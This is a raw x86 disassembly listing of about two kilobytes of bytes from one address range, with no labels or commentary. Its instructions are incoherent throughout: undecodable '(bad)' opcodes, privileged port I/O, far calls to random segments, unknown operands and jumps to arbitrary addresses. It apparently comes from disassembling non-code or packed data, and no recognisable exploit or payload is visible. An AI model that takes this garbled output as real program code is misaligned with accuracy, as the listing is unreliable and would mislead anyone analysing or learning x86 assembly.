  40cdfb:	rcl    dh,cl
  40cdfd:	mov    WORD PTR [eax+edi*4-0x29],?
  40ce01:	out    0x2f,eax
  40ce03:	add    BYTE PTR ds:[eax],al
  40ce06:	or     DWORD PTR [eax-0x69],0xffffff83
  40ce0a:	rcl    BYTE PTR [edx],0xed
  40ce0d:	mov    al,BYTE PTR [ebp-0x6c]
  40ce10:	jp     0x40ce40
  40ce12:	(bad)  
  40ce13:	cld    
  40ce14:	xchg   edx,eax
  40ce15:	mov    edi,eax
  40ce17:	cmp    al,0xaf
  40ce19:	std    
  40ce1a:	push   edi
  40ce1b:	mov    BYTE PTR [eax],0xe8
  40ce1e:	in     eax,0x75
  40ce20:	out    dx,eax
  40ce21:	add    DWORD PTR [eax],eax
  40ce23:	stc    
  40ce24:	push   0xd5ee590f
  40ce29:	pop    es
  40ce2a:	cmp    ecx,DWORD PTR [edx-0x33]
  40ce2d:	xor    DWORD PTR [esi-0x74],esp
  40ce30:	mov    ecx,DWORD PTR [esi]
  40ce32:	dec    ebp
  40ce33:	lock (bad) 
  40ce36:	aas    
  40ce37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce38:	pop    esp
  40ce39:	lock fild WORD PTR [edi+0x7d6a03e9]
  40ce40:	add    DWORD PTR [eax],eax
  40ce42:	je     0x40cdf9
  40ce44:	test   eax,0xd1b14387
  40ce49:	xor    ebp,eax
  40ce4b:	sbb    DWORD PTR [edi+0x4],esp
  40ce4e:	add    BYTE PTR [eax],al
  40ce50:	add    BYTE PTR [eax],al
  40ce52:	add    BYTE PTR [eax],al
  40ce54:	inc    esi
  40ce55:	bound  ebx,QWORD PTR ds:0x2ca1ad89
  40ce5b:	lea    eax,[ecx-0x427d03fb]
  40ce61:	xor    ebp,DWORD PTR [ecx+ebx*1-0x7bfd55da]
  40ce68:	mov    ch,0xac
  40ce6a:	clc    
  40ce6b:	(bad)  
  40ce6c:	popa   
  40ce6d:	add    eax,0xfd398cf8
  40ce72:	aas    
  40ce73:	inc    DWORD PTR [ecx+0x5]
  40ce76:	cld    
  40ce77:	dec    edi
  40ce78:	sub    bh,BYTE PTR [edi-0x61171800]
  40ce7e:	add    BYTE PTR [eax],al
  40ce80:	popf   
  40ce81:	add    al,0x52
  40ce83:	add    BYTE PTR [ebp+0x20],dh
  40ce86:	inc    eax
  40ce87:	and    al,0x85
  40ce89:	fs xor al,0x5b
  40ce8c:	out    dx,al
  40ce8d:	add    eax,0xa981c239
  40ce92:	das    
  40ce93:	mov    ebx,DWORD PTR [ecx+0x7707a829]
  40ce99:	test   eax,0x1f08d02
  40ce9e:	loope  0x40ce38
  40cea0:	jae    0x40ce34
  40cea2:	cmp    BYTE PTR [esi*8-0x330016fe],ch
  40cea9:	add    cl,dh
  40ceab:	adc    BYTE PTR [ebp+0x1c],ch
  40ceae:	in     eax,dx
  40ceaf:	stos   DWORD PTR es:[edi],eax
  40ceb0:	inc    edx
  40ceb1:	(bad)  
  40ceb2:	out    0x3,eax
  40ceb4:	lock ret 0xf33c
  40ceb8:	add    BYTE PTR [eax],al
  40ceba:	add    BYTE PTR [eax],al
  40cebc:	add    ah,cl
  40cebe:	add    bl,BYTE PTR [eax+eax*4+0x42]
  40cec2:	nop
  40cec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cec4:	xchg   esi,eax
  40cec5:	ret    0xf391
  40cec8:	dec    edi
  40cec9:	test   BYTE PTR [edx-0x17],al
  40cecc:	and    dl,0x17
  40cecf:	in     eax,0xd1
  40ced1:	ficomp DWORD PTR [ebp-0x1766938]
  40ced7:	imul   eax,DWORD PTR [eax-0x698a6ffe],0xffffff9a
  40cede:	sub    al,0x3
  40cee1:	jne    0x40cefd
  40cee3:	sbb    DWORD PTR [eax],edx
  40cee5:	xor    eax,0x7529b902
  40ceea:	call   0xc364:0x275bf72
  40cef1:	imul   esi,DWORD PTR [edi+0x28],0xffffffcc
  40cef5:	mov    ah,0xfa
  40cef7:	call   0x63dfcd2c
  40cefc:	inc    eax
  40cefd:	jno    0x40cf31
  40ceff:	adc    BYTE PTR cs:[ecx-0x6f],ch
  40cf03:	mov    ebx,0x94c2f80b
  40cf08:	aaa    
  40cf09:	inc    edx
  40cf0a:	xchg   ecx,eax
  40cf0b:	fwait
  40cf0c:	pop    es
  40cf0d:	lea    ebx,[eax-0x4]
  40cf10:	add    dh,BYTE PTR [ebp+0x7d]
  40cf13:	add    BYTE PTR [eax-0x6955e96d],al
  40cf19:	add    edx,esi
  40cf1b:	push   ebp
  40cf1d:	mov    al,0x90
  40cf1f:	adc    al,0xd5
  40cf21:	add    BYTE PTR [eax],al
  40cf23:	add    BYTE PTR [eax],al
  40cf25:	add    BYTE PTR [esi+0x396bffd1],al
  40cf2b:	adc    eax,0x1600372e
  40cf30:	adc    al,0x62
  40cf32:	jb     0x40cf32
  40cf34:	mov    WORD PTR [ecx+ebp*2],fs
  40cf37:	sbb    dl,al
  40cf39:	jo     0x40cef4
  40cf3b:	add    dl,BYTE PTR [eax-0x2f]
  40cf3e:	std    
  40cf3f:	push   ecx
  40cf40:	add    cl,ch
  40cf42:	cmc    
  40cf43:	les    ecx,FWORD PTR [ebx]
  40cf45:	xor    DWORD PTR fs:[edi],ecx
  40cf48:	adc    DWORD PTR [esi-0x6eaa057e],esp
  40cf4e:	lea    ebp,[ebx]
  40cf50:	add    ecx,ebp
  40cf52:	or     DWORD PTR [esi],edx
  40cf54:	or     BYTE PTR [ecx-0x16ff3d6d],al
  40cf5a:	dec    eax
  40cf5b:	cmp    eax,ebp
  40cf5d:	inc    esi
  40cf5e:	add    al,BYTE PTR ss:[eax]
  40cf61:	jbe    0x40cfd5
  40cf63:	(bad)  
  40cf64:	(bad)  
  40cf65:	aam    0xfa
  40cf67:	repz aas 
  40cf69:	jmp    0xfa02ff17
  40cf6e:	jbe    0x40cfa7
  40cf70:	mov    eax,DWORD PTR [ebp-0xc]
  40cf73:	pushf  
  40cf74:	imul   esi,DWORD PTR [edi-0x7e6bea0d],0x31
  40cf7b:	xchg   ecx,eax
  40cf7c:	(bad)  
  40cf7d:	jmp    0xe88783a0
  40cf82:	jbe    0x40d001
  40cf84:	lds    ebx,FWORD PTR [ecx-0x4540a1f]
  40cf8a:	add    BYTE PTR [eax],al
  40cf8c:	add    BYTE PTR [eax],al
  40cf8e:	add    BYTE PTR [esi],dh
  40cf90:	add    cl,BYTE PTR [ecx-0x4079fd5c]
  40cf96:	out    0x22,al
  40cf98:	lods   al,BYTE PTR ds:[esi]
  40cf99:	(bad)  
  40cf9a:	call   0x980515
  40cf9f:	or     ecx,edi
  40cfa1:	scas   eax,DWORD PTR es:[edi]
  40cfa2:	mov    eax,0x635
  40cfa7:	je     0x40cf95
  40cfa9:	inc    esi
  40cfaa:	add    DWORD PTR [ecx+edi*2+0x446ea833],ecx
  40cfb1:	add    BYTE PTR [ebx+0x75fed413],cl
  40cfb7:	dec    eax
  40cfb8:	ja     0x40cf8e
  40cfba:	mov    esp,DWORD PTR [ecx+ecx*4]
  40cfbd:	jnp    0x40cf9b
  40cfbf:	hlt    
  40cfc0:	sub    edi,edi
  40cfc2:	call   FWORD PTR [esp+ebx*2+0x5b]
  40cfc6:	inc    edi
  40cfc7:	dec    ebp
  40cfc8:	add    al,0x8b
  40cfca:	(bad)  
  40cfcb:	pop    esp
  40cfcc:	jne    0x40d041
  40cfce:	cld    
  40cfcf:	fistp  DWORD PTR [ebp-0x79]
  40cfd2:	inc    ebp
  40cfd3:	or     al,0x89
  40cfd5:	jnp    0x40cf9f
  40cfd7:	les    ebp,FWORD PTR [edx]
  40cfd9:	(bad)  
  40cfda:	dec    DWORD PTR [esp+ebx*2]
  40cfdd:	inc    ebx
  40cfde:	inc    edi
  40cfdf:	sbb    eax,0x6cc78b04
  40cfe4:	jne    0x40d059
  40cfe6:	cld    
  40cfe7:	mov    ebx,DWORD PTR [ebp+0x31]
  40cfea:	not    BYTE PTR [edi-0x2f21c695]
  40cff0:	idiv   DWORD PTR [eax]
  40cff2:	jne    0x40cff4
  40cff4:	add    BYTE PTR [eax],al
  40cff6:	add    BYTE PTR [eax],al
  40cff8:	dec    esp
  40cff9:	push   DWORD PTR [esi+0x3b]
  40cffc:	dec    edx
  40cffd:	push   DWORD PTR [edx+0x68]
  40d000:	fdiv   st(7),st
  40d002:	aas    
  40d003:	add    BYTE PTR [ebx+esi*8],ah
  40d006:	push   ebp
  40d007:	add    esp,ebx
  40d009:	jbe    0x40d01e
  40d00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d00c:	sahf   
  40d00d:	inc    ebx
  40d00e:	add    BYTE PTR [ecx-0x77e97ef],cl
  40d014:	pop    ebx
  40d015:	dec    DWORD PTR [edi+edi*8]
  40d018:	add    DWORD PTR [eax],ecx
  40d01a:	push   DWORD PTR [ebp+0x75]
  40d01d:	mov    eax,ds:0x68d5732
  40d022:	xchg   ebp,eax
  40d023:	(bad)  
  40d024:	xchg   edx,eax
  40d025:	push   ss
  40d026:	ds clc 
  40d028:	and    eax,0x25f43e1e
  40d02d:	add    DWORD PTR [ecx],0x56
  40d030:	and    esp,DWORD PTR [eax+0x2d3584ae]
  40d036:	shl    BYTE PTR [edx],1
  40d038:	dec    esi
  40d039:	loop   0x40d053
  40d03b:	clc    
  40d03c:	jmp    0x40d046
  40d03e:	jg     0x40d084
  40d040:	popa   
  40d041:	add    BYTE PTR cs:[esi],al
  40d044:	(bad)  
  40d045:	fsincos 
  40d047:	test   BYTE PTR ds:0x3d8308d5,dh
  40d04d:	popf   
  40d04e:	pop    ss
  40d04f:	adc    al,0xee
  40d051:	cdq    
  40d052:	int    0x44
  40d054:	and    ebp,ebp
  40d056:	add    bh,bh
  40d058:	mov    al,ds:0x74919d
  40d05d:	add    BYTE PTR [eax],al
  40d05f:	add    BYTE PTR [eax],al
  40d061:	ins    DWORD PTR es:[edi],dx
  40d062:	leave  
  40d063:	cmp    ch,al
  40d065:	sar    DWORD PTR [esi-0x6e],cl
  40d068:	(bad)  
  40d069:	mov    dh,0x1c
  40d06b:	retf   0x4e0b
  40d06e:	out    dx,al
  40d06f:	mov    esi,DWORD PTR [ecx+0x24]
  40d072:	sbb    BYTE PTR [ecx],bl
  40d074:	hlt    
  40d075:	cli    
  40d076:	cmc    
  40d077:	xchg   ebx,eax
  40d078:	(bad)  
  40d079:	push   0x2d149325
  40d07e:	mov    eax,DWORD PTR [edx+0x0]
  40d081:	inc    edx
  40d082:	push   esp
  40d083:	xor    cl,cl
  40d085:	mov    bh,0xa0
  40d087:	add    bh,BYTE PTR [ecx]
  40d089:	loope  0x40d020
  40d08b:	cs mov dl,ch
  40d08e:	mov    eax,0x3a5637d5
  40d093:	mov    bl,0x3e
  40d095:	test   BYTE PTR [edi],dl
  40d097:	xor    BYTE PTR ss:[esi],dh
  40d09a:	add    bl,BYTE PTR [eax]
  40d09c:	cmp    dl,BYTE PTR [ebp+0x43]
  40d09f:	and    bl,bl
  40d0a1:	in     eax,0x1a
  40d0a3:	or     BYTE PTR [ebx-0x538c996e],dh
  40d0a9:	xor    BYTE PTR [edi-0x10],ah
  40d0ac:	mov    bl,0x19
  40d0ae:	daa    
  40d0af:	or     BYTE PTR [esi],dh
  40d0b1:	pop    ebp
  40d0b2:	inc    ebx
  40d0b3:	dec    eax
  40d0b4:	sub    ebx,DWORD PTR [edi+0x1cb30826]
  40d0ba:	loop   0x40d067
  40d0bc:	mov    bl,0xde
  40d0be:	jge    0x40d0e4
  40d0c0:	ins    DWORD PTR es:[edi],dx
  40d0c1:	shl    DWORD PTR ds:0x2f45,1
  40d0c7:	add    BYTE PTR [eax],al
  40d0c9:	add    BYTE PTR [ebp-0x214d3633],ch
  40d0cf:	aad    0x22
  40d0d1:	xor    eax,DWORD PTR [edi]
  40d0d3:	out    0xc7,eax
  40d0d5:	jg     0x40d0cd
  40d0d7:	dec    edi
  40d0d8:	aam    0xe3
  40d0da:	out    0xa1,eax
  40d0dc:	pop    es
  40d0dd:	mov    ah,0x1a
  40d0df:	dec    ecx
  40d0e0:	xchg   DWORD PTR [edx-0x71bc6762],esi
  40d0e6:	(bad)  
  40d0e7:	aad    0x2
  40d0e9:	in     eax,dx
  40d0ea:	pop    esi
  40d0eb:	jge    0x40d128
  40d0ed:	neg    BYTE PTR [esi-0x680cf3db]
  40d0f3:	mov    eax,ds:0x258eb2cf
  40d0f8:	or     ecx,DWORD PTR [edi-0x4e]
  40d0fb:	or     DWORD PTR [eax-0x7c66e161],ecx
  40d101:	mov    ?,WORD PTR [esi]
  40d103:	(bad)  
  40d104:	mov    dl,0xe3
  40d106:	pop    ebp
  40d107:	test   DWORD PTR [ecx+0x72],ebx
  40d10a:	dec    esi
  40d10b:	push   0x73
  40d10d:	mov    cs,WORD PTR [esi-0x68]
  40d110:	mov    ds:0x4827846e,eax
  40d115:	mov    dl,0xd5
  40d117:	icebp  
  40d118:	jmp    FWORD PTR [ebx]
  40d11a:	and    esp,DWORD PTR [esi-0x7e40dbe6]
  40d120:	inc    esp
  40d121:	js     0x40d10a
  40d123:	sbb    DWORD PTR [edi],ecx
  40d125:	mov    bh,ah
  40d127:	sbb    DWORD PTR [edi-0x7b],esp
  40d12a:	or     eax,DWORD PTR [ebp+0x47]
  40d12d:	pop    eax
  40d12e:	add    BYTE PTR [eax],al
  40d130:	add    BYTE PTR [eax],al
  40d132:	add    BYTE PTR [esi],cl
  40d134:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d135:	cwde   
  40d136:	lock leave 
  40d138:	in     al,dx
  40d139:	data16 or BYTE PTR [eax-0x26],cl
  40d13d:	inc    edx
  40d13e:	and    al,0xf7
  40d140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d141:	mov    al,ds:0x66ed7fe0
  40d146:	enter  0x58ad,0x36
  40d14a:	lock lock xor esp,DWORD PTR [ebp-0x38]
  40d14f:	popf   
  40d150:	pop    eax
  40d151:	ss loopne 0x40d1c6
  40d154:	in     al,dx
  40d155:	enterw 0x19a2,0xea
  40d15a:	inc    esp
  40d15b:	lock fsub QWORD PTR [eax+ecx*8+0x4]
  40d160:	leave  
  40d161:	jmp    0x40d169
  40d163:	hlt    
  40d164:	or     BYTE PTR [edi],0xd8
  40d167:	in     eax,0x18
  40d169:	fldz   
  40d16b:	in     al,0x18
  40d16d:	addr16 or al,0x24
  40d170:	cmc    
  40d171:	sub    eax,0x4345a1fd
  40d176:	cmp    ch,dh
  40d178:	sub    BYTE PTR [eax+0x6b],0xc4
  40d17c:	sbb    bl,ah
  40d17e:	enter  0x2099,0xea
  40d182:	inc    esp
  40d183:	add    BYTE PTR [ebp+0x37],al
  40d186:	pop    es
  40d187:	dec    eax
  40d188:	inc    ebp
  40d189:	jg     0x40d126
  40d18b:	mov    esp,0x2449a2ec
  40d190:	retf   
  40d191:	jmp    0x35cdd21a
  40d196:	add    BYTE PTR [eax],al
  40d198:	add    BYTE PTR [eax],al
  40d19a:	add    BYTE PTR [eax],al
  40d19c:	inc    ebp
  40d19d:	jmp    0x40d12c
  40d19f:	and    al,0x2d
  40d1a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1a2:	ja     0x40d1cf
  40d1a4:	jnp    0x40d1b9
  40d1a6:	imul   esp,esp,0x79
  40d1a9:	push   edi
  40d1aa:	(bad)  
  40d1ac:	pop    ecx
  40d1ad:	jnp    0x40d21b
  40d1af:	ins    DWORD PTR es:[di],dx
  40d1b1:	adc    DWORD PTR [ecx-0x6e38b6ed],0x72
  40d1b8:	lods   eax,DWORD PTR ds:[esi]
  40d1b9:	dec    ebx
  40d1ba:	sub    ah,BYTE PTR [edi-0x45]
  40d1bd:	sbb    eax,0xd46c6847
  40d1c2:	daa    
  40d1c3:	inc    ebx
  40d1c4:	adc    eax,0xbd676a99
  40d1c9:	prefetcht2 BYTE PTR [esi+0x68471dc7]
  40d1d0:	add    al,BYTE PTR [ecx-0x79b713cb]
  40d1d6:	rcl    DWORD PTR [ebp-0x29],0x6b
  40d1da:	jg     0x40d1c8
  40d1dc:	js     0x40d1d8
  40d1de:	(bad)  
  40d1df:	jmp    FWORD PTR [edx-0x37]
  40d1e2:	mov    esi,0x4dee
  40d1e7:	push   edi
  40d1e8:	jecxz  0x40d1de
  40d1ea:	pop    es
  40d1eb:	push   0x4165c4
  40d1f0:	add    edx,DWORD PTR [ebp+0x64c164a]
  40d1f6:	add    esp,0x30
  40d1f9:	or     eax,0x72f1e4b4
  40d1fe:	std    
  40d1ff:	call   0x40d204
  40d204:	add    BYTE PTR [edx+eiz*8-0x69890001],bh
  40d20b:	mov    eax,DWORD PTR [ebp-0x28f88]
  40d211:	adc    eax,0xcc43e118
  40d216:	fdivr  DWORD PTR [bx-0x658b]
  40d21b:	add    al,BYTE PTR [ebp-0x75024a4b]
  40d221:	mov    bl,0xdb
  40d223:	add    al,BYTE PTR [eax]
  40d225:	xor    eax,0x87f9155c
  40d22a:	fstp   DWORD PTR [ebx+0x7db51f6e]
  40d230:	test   BYTE PTR [ebx],ah
  40d232:	in     al,0x8f
  40d234:	inc    BYTE PTR [ebp+0x6f]
  40d237:	add    cl,BYTE PTR [ebp-0x387c32e0]
  40d23d:	xchg   edx,eax
  40d23e:	add    eax,ecx
  40d240:	mov    ds:0xbf859974,eax
  40d245:	add    ebp,DWORD PTR [esi-0x7eda3a85]
  40d24b:	sbb    ch,0xb6
  40d24e:	cdq    
  40d24f:	jge    0x40d1d5
  40d251:	dec    ecx
  40d252:	mov    al,ds:0xb1c5fe8e
  40d257:	ins    BYTE PTR es:[edi],dx
  40d258:	push   DWORD PTR [ebp-0x67]
  40d25b:	xchg   DWORD PTR [edi-0x7c3be97e],edi
  40d261:	xor    eax,0x3532fcce
  40d266:	inc    ebx
  40d267:	jge    0x40d1ed
  40d269:	add    BYTE PTR [eax],al
  40d26b:	add    BYTE PTR [eax],al
  40d26d:	add    BYTE PTR [ecx],bl
  40d26f:	push   eax
  40d270:	mov    ?,esi
  40d272:	xor    dl,BYTE PTR [esi-0x664921f2]
  40d278:	jg     0x40d1fe
  40d27a:	inc    ecx
  40d27b:	pusha  
  40d27c:	mov    ?,esi
  40d27e:	lds    esi,FWORD PTR [eax+edi*8-0x61]
  40d282:	fld    DWORD PTR [bp+di]
  40d285:	test   DWORD PTR ds:0xe38916,esi
  40d28b:	or     al,0x8f
  40d28d:	jae    0x40d2fb
  40d28f:	pop    ebx
  40d290:	add    eax,DWORD PTR [eax]
  40d292:	xor    eax,0xdef918ec
  40d297:	add    DWORD PTR [edi-0x3a],edi
  40d29a:	loop   0x40d226
  40d29c:	test   al,0x3e
  40d29e:	pusha  
  40d29f:	mov    DWORD PTR [eax+0x202c3205],ebx
  40d2a5:	ret    0x276
  40d2a8:	pushf  
  40d2a9:	jp     0x40d279
  40d2ab:	or     BYTE PTR [eax+ebx*1+0x73],0x2
  40d2b0:	jmp    0x12101de7
  40d2b5:	aaa    
  40d2b6:	clc    
  40d2b7:	adc    al,0x35
  40d2b9:	dec    esp
  40d2ba:	fiadd  WORD PTR [ecx]
  40d2bc:	jmp    0x166dbfc4
  40d2c1:	pushf  
  40d2c2:	rol    DWORD PTR [ebp-0x18],cl
  40d2c5:	add    edi,esi
  40d2c7:	ret    
  40d2c8:	cwde   
  40d2c9:	mov    gs,WORD PTR [ecx+0x5e]
  40d2cc:	fiadd  DWORD PTR [ebx+0x75]
  40d2cf:	jns    0x40d27c
  40d2d1:	xchg   edi,eax
  40d2d2:	add    BYTE PTR [eax],al
  40d2d4:	add    BYTE PTR [eax],al
  40d2d6:	add    BYTE PTR [edi+0x1487ddc5],ch
  40d2dc:	add    ebp,ecx
  40d2de:	add    esi,eax
  40d2e0:	pop    es
  40d2e1:	lea    ecx,[ebx+0x19]
  40d2e4:	add    ebp,ecx
  40d2e6:	add    ebx,DWORD PTR [ebp+0x1b]
  40d2e9:	and    eax,0xad7d7505
  40d2ee:	xor    eax,DWORD PTR [edx+0x10]
  40d2f1:	mov    ch,0x8e
  40d2f3:	popa   
  40d2f4:	pop    edx
  40d2f5:	fiadd  DWORD PTR [ebx+0x75]
  40d2f8:	int    0xa9
  40d2fa:	pop    ss
  40d2fb:	mov    ds:0xc58c3377,al
  40d300:	ja     0x40d36d
  40d302:	arpl   WORD PTR [ecx],bx
  40d304:	mov    dl,BYTE PTR [ebp-0x6ebfc5cc]
  40d30a:	pop    es
  40d30b:	je     0x40d30f
  40d30d:	jmp    0x80c705a0
  40d312:	add    al,0x80
  40d314:	sub    BYTE PTR [eax],al
  40d316:	fs std 
  40d318:	jno    0x40d314
  40d31a:	outs   dx,BYTE PTR ds:[esi]
  40d31b:	sti    
  40d31c:	cmp    DWORD PTR [edx-0x18],ebp
  40d31f:	jl     0x40d2aa
  40d321:	imul   esp,esi,0xb11489a7
  40d327:	(bad)  
  40d328:	leave  
  40d329:	jmp    DWORD PTR [ebx-0x4a]
  40d32c:	push   cs
  40d32d:	inc    esi
  40d32e:	je     0x40d31d
  40d330:	imul   edi,esp,0xff39eb3e
  40d336:	(bad)  
  40d338:	repz aas 
  40d33a:	jmp    0x40d33f
  40d33f:	add    BYTE PTR [esi+0x7b],ah
  40d342:	inc    esp
  40d343:	and    ebp,esi
  40d345:	jle    0x40d2de
  40d347:	and    ch,bl
  40d349:	mov    BYTE PTR [edi+0x64],cl
  40d34c:	std    
  40d34d:	imul   edi,esp,0xff39fb0e
  40d353:	fdiv   QWORD PTR [esi-0x1216c00c]
  40d359:	dec    ecx
  40d35a:	je     0x40d330
  40d35c:	out    dx,eax
  40d35d:	ds clc 
  40d35f:	pop    esp
  40d360:	repnz cmp eax,0x87f0e298
  40d366:	dec    edi
  40d367:	push   0x19
  40d369:	mov    BYTE PTR [esp+ebx*4-0x3101731f],cl
  40d370:	jmp    0x772978b9
  40d375:	rol    BYTE PTR [esi+edi*4+0x76],0x89
  40d37a:	je     0x40d339
  40d37c:	add    dh,ch
  40d37e:	mov    bh,0xdb
  40d380:	mov    dh,0x2
  40d382:	cmp    BYTE PTR [eax+esi*8+0xd],al
  40d386:	pop    es
  40d387:	(bad)  [esi]
  40d389:	call   0x2c88:0x276e871
  40d390:	clc    
  40d391:	jns    0x40d3ef
  40d393:	add    ah,ah
  40d395:	ss das 
  40d397:	je     0x40d3e5
  40d399:	dec    BYTE PTR [ebp+eax*2+0x458ccdf4]
  40d3a0:	lock int 0x8c
  40d3a3:	inc    ebp
  40d3a4:	add    BYTE PTR [eax],al
  40d3a6:	add    BYTE PTR [eax],al
  40d3a8:	add    BYTE PTR [esi+ecx*8],bh
  40d3ab:	imul   edi,edi,0x50f84149
  40d3b1:	mov    dh,0x2
  40d3b3:	push   ebx
  40d3b4:	push   ebx
  40d3b5:	push   ebp
  40d3b6:	fincstp 
  40d3b8:	jmp    DWORD PTR [ecx-0x33bfee58]
  40d3be:	or     eax,DWORD PTR [esp+ebp*8-0x59]
  40d3c2:	shl    DWORD PTR [edx+0xb],0x99
  40d3c6:	push   0xfffffffe
  40d3c8:	dec    DWORD PTR [ebp+eax*4+0x48ce483]
  40d3cf:	add    BYTE PTR [ecx],bh
  40d3d1:	leave  
  40d3d2:	jl     0x40d3e1
  40d3d4:	test   BYTE PTR [edx-0x2],ch
  40d3d7:	(bad)  
  40d3d8:	(bad)  
  40d3d9:	mov    edi,0x7c5d376e
  40d3de:	test   DWORD PTR [edx+edi*4-0x72fffba4],eax
  40d3e5:	adc    DWORD PTR [eax+0x4e],esi
  40d3e8:	mov    edx,DWORD PTR [ecx+0x3b176876]
  40d3ee:	mov    al,0xae
  40d3f0:	push   ebx
  40d3f1:	sub    edx,DWORD PTR [ecx-0x163ecce]
  40d3f7:	test   al,al
  40d3f9:	dec    ebx
  40d3fa:	adc    DWORD PTR [ebx-0x74fbb400],0xc1baf045
  40d404:	seto   BYTE PTR [ecx]
  40d407:	(bad)  
  40d408:	dec    DWORD PTR [ecx+ecx*1]
  40d40b:	mov    WORD PTR [eax+0x0],fs
  40d411:	add    cl,bh
  40d413:	jbe    0x40d412
  40d415:	push   ecx
  40d416:	jne    0x40d488
  40d418:	adc    dl,BYTE PTR [eax]
  40d41a:	sbb    eax,0x7501d80c
  40d41f:	adc    eax,0x168b73c3
  40d424:	xchg   BYTE PTR [edi+0x4f8c10ee],dl
  40d42a:	clc    
  40d42b:	push   ds
  40d42c:	arpl   sp,di
  40d42e:	loop   0x40d450
  40d430:	xor    edx,DWORD PTR [eax-0x33]
  40d433:	inc    ebx
  40d434:	(bad)  
  40d435:	call   edx
  40d437:	push   ss
  40d438:	ret    
  40d439:	jae    0x40d45e
  40d43b:	xchg   BYTE PTR es:[edi+0x4f8c40c0],bl
  40d442:	int    0x9b
  40d444:	in     eax,dx
  40d445:	add    DWORD PTR [ebp+0x15],esi
  40d448:	ret    
  40d449:	jae    0x40d47e
  40d44b:	xchg   BYTE PTR es:[edi+0x4f8be09c],cl
  40d452:	or     eax,0x79000319
  40d457:	dec    eax
  40d458:	jge    0x40d3de
  40d45a:	aad    0xf6
  40d45c:	mov    edi,esi
  40d45e:	and    eax,0xba6f9a6c
  40d463:	call   0x52db:0x5358502
  40d46a:	clc    
  40d46b:	sbb    eax,0xa062f873
  40d470:	xor    edx,DWORD PTR [ebx+0x4d]
  40d473:	or     edi,DWORD PTR [ecx+0xff]
  40d479:	add    BYTE PTR [eax],al
  40d47b:	push   edx
  40d47c:	adc    eax,0x266373c4
  40d481:	or     DWORD PTR [edi+0x4f8ac03c],0xfe8fddee
  40d48b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d48c:	test   eax,0x9a2a44c0
  40d491:	call   0x1b8b:0xa6021e23
  40d498:	or     eax,0xd2698b95
  40d49d:	stc    
  40d49e:	inc    ebx
  40d49f:	jne    0x40d4e1
  40d4a1:	rcl    BYTE PTR [eax],cl
  40d4a3:	add    eax,0xfa426af7
  40d4a8:	xchg   BYTE PTR [ebp-0x75],bh
  40d4ab:	imul   ecx,DWORD PTR [edx-0xc650e8b],0x4f40428
  40d4b5:	push   ebp
  40d4b6:	sahf   
  40d4b7:	fiadd  DWORD PTR [esi-0x65090518]
  40d4bd:	push   esi
  40d4be:	mov    ecx,ebx
  40d4c0:	je     0x40d525
  40d4c2:	ins    BYTE PTR es:[edi],dx
  40d4c3:	mov    edi,0x4f344586
  40d4c8:	add    ebx,edx
  40d4ca:	mov    bl,BYTE PTR [edx]
  40d4cc:	jmp    FWORD PTR [eax+0x4]
  40d4cf:	jne    0x40d504
  40d4d1:	cs icebp 
  40d4d3:	dec    edx
  40d4d4:	repz test al,0x3
  40d4d7:	lock rcl DWORD PTR [ebx+0x787d01cf],0x8d
  40d4df:	add    BYTE PTR [eax],al
  40d4e1:	add    BYTE PTR [eax],al
  40d4e3:	add    BYTE PTR [ebx-0xae4477a],cl
  40d4e9:	add    ecx,ebp
  40d4eb:	jmp    DWORD PTR [ebx]
  40d4ed:	jne    0x40d552
  40d4ef:	ins    BYTE PTR es:[edi],dx
  40d4f0:	outs   dx,DWORD PTR ds:[esi]
  40d4f1:	xchg   ch,dh
  40d4f3:	xor    eax,esi
  40d4f5:	call   0xc36c:0x2754a06
  40d4fc:	out    0xec,al
  40d4fe:	cmp    DWORD PTR [ecx-0x7],edi
  40d501:	jb     0x40d4d2
  40d503:	mov    cl,BYTE PTR [ebx+0x33]
  40d506:	cmp    bl,BYTE PTR [edx+edi*2-0xefc1749]
  40d50d:	ret    0x34
  40d510:	cmp    eax,DWORD PTR [eax+0x0]
  40d513:	mov    dh,0x71
  40d515:	js     0x40d55b
  40d517:	scas   al,BYTE PTR es:[edi]
  40d518:	dec    edi
  40d519:	and    al,0x5b
  40d51b:	mov    al,0x33
  40d51d:	das    
  40d51e:	mov    ecx,DWORD PTR [ebp-0x197c6607]
  40d524:	jbe    0x40d528
  40d526:	push   ebx
  40d527:	aaa    
  40d528:	inc    esi
  40d529:	ja     0x40d4df
  40d52b:	jmp    0x923f5a17
  40d530:	iret   
  40d531:	sbb    DWORD PTR [eax],eax
  40d533:	jmp    0x64cdc3c0
  40d538:	push   0xa666fe8d
  40d53d:	or     edx,0x8d02705e
  40d543:	pushf  
  40d544:	xchg   esi,eax
  40d545:	test   esi,edi
  40d547:	dec    esi
  40d548:	add    BYTE PTR [eax],al
  40d54a:	add    BYTE PTR [eax],al
  40d54c:	add    BYTE PTR [ebx-0x40],al
  40d54f:	out    0x4d,eax
  40d551:	push   ecx
  40d552:	add    al,BYTE PTR [eax]
  40d554:	fs mov dh,0x7
  40d557:	sbb    eax,0x6835b462
  40d55c:	imul   ecx,esp,0xf5740040
  40d562:	test   edx,edi
  40d564:	push   ds
  40d565:	push   DWORD PTR ds:0x85fd5fe8
  40d56b:	(bad)  
  40d56c:	fs mov dh,0xf4
  40d56f:	xchg   esp,eax
  40d570:	sub    edx,edi
  40d572:	inc    esp
  40d573:	je     0x40d565
  40d575:	dec    ebx
  40d576:	inc    ebp
  40d577:	gs pusha 
  40d579:	cmc    
  40d57a:	test   dl,bh
  40d57c:	out    dx,al
  40d57d:	in     al,dx
  40d57e:	ja     0x40d5bc
  40d580:	lods   eax,DWORD PTR ds:[esi]
  40d581:	pusha  
  40d582:	(bad)  
  40d585:	rol    BYTE PTR [ebp+0x34fcd6fa],cl
  40d58b:	push   DWORD PTR [esi+0x8cee63]
  40d591:	leave  
  40d592:	sub    al,0xf7
  40d594:	push   ebx
  40d596:	int    0x69
  40d598:	add    BYTE PTR [ecx-0x3074500b],dl
  40d59e:	gs xchg esp,eax
  40d5a0:	mov    eax,ds:0xc085010d
  40d5a5:	jb     0x40d544
  40d5a7:	mov    esi,eax
  40d5a9:	dec    esp
